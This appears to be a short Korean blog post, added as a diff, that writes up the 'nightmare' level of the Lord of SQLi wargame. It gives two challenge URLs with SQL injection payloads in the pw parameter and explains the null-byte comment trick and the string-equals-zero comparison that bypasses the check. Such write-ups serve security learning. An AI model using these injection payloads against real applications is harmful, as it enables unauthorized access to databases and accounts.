@@ -1,0 +1,31 @@
+---
+layout: post
+title: LOS NightMare 
+date: 2015-08-16 23:12:00 +0900
+category: Hacking 
+---
+```
+http://leaveret.kr/los/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?pw=%27)|0;%00
+```
+
+
+
+;%00이 주석처리문자
+
+
+```
+http://los.sandbox.cash/chall/nightmare_a72d12e4f9c7c341cb6fe36881f7be01.php?pw=%27)=0;%00
+```
+
+
+
+사이트가 이전된후론 전 풀이가 먹히지 않는데 
+
+| 와 ^ 연산은 안먹히고 =이 먹힌다.
+
+
+
+원래는 문자열과 0을 | 이나 ^ 연산 하게되면 참이 되는 점을 이용한 문제인데 여기선 문자열과0 을 참으로 비교해도 참이 되는 점을 이용했다.
+
+
+
